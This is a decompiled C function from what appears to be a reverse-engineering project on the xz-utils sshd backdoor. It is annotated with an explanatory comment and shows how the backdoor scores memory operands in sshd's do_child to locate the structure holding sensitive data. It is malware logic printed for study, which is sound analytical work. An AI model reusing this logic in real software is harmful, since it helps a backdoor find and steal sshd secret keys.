// /home/kali/xzre-ghidra/xzregh/103870_sshd_get_sensitive_data_score_in_do_child.c
// Function: sshd_get_sensitive_data_score_in_do_child @ 0x103870
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_do_child(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Uses the string catalogue to locate `do_child` and counts how many memory operands touch the supplied pointer at offsets
 * 0 and +0x10. Touching the base is worth one point while seeing multiple hits on +0x10 yields up to two more, so routines
 * that read both halves of the struct bubble to the top. The tiny score (0–3) feeds into the aggregate heuristic that
 * selects the best candidate.
 */

#include "xzre_types.h"

int sshd_get_sensitive_data_score_in_do_child
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL hit_found;
  long clear_idx;
  u8 **ctx_cursor;
  uint score;
  u8 zero_seed;
  dasm_ctx_t insn_ctx;
  u8 *do_child_start;
  u8 *do_child_end;
  
  zero_seed = 0;
  score = 0;
  code_start = (u8 *)refs->entries[1].func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)refs->entries[1].func_end;
    hit_found = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    score = (uint)(hit_found != FALSE);
    ctx_cursor = &do_child_start;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(undefined4 *)ctx_cursor = 0;
      ctx_cursor = (u8 **)((long)ctx_cursor + (ulong)zero_seed * -8 + 4);
    }
    hit_found = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)&do_child_start,
                       (void *)((long)sensitive_data + 0x10));
    if (hit_found != FALSE) {
      hit_found = find_instruction_with_mem_operand
                        (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
                         (void *)((long)sensitive_data + 0x10));
      if (hit_found == FALSE) {
        score = score + 1;
      }
      else {
        score = score + 2;
      }
    }
  }
  return score;
}

